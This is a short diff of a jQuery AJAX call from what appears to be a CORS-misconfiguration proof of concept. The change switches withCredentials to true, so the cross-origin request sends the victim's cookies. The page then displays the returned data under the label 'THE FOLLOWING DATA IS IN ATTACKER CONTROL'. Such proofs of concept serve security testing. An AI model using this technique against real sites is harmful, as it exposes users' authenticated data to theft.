@@ -12,7 +12,7 @@ $.ajax({
         document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ x;
     },
     xhrFields: {
-       withCredentials: false
+       withCredentials: true
     },
     error : function(request,error)
     {
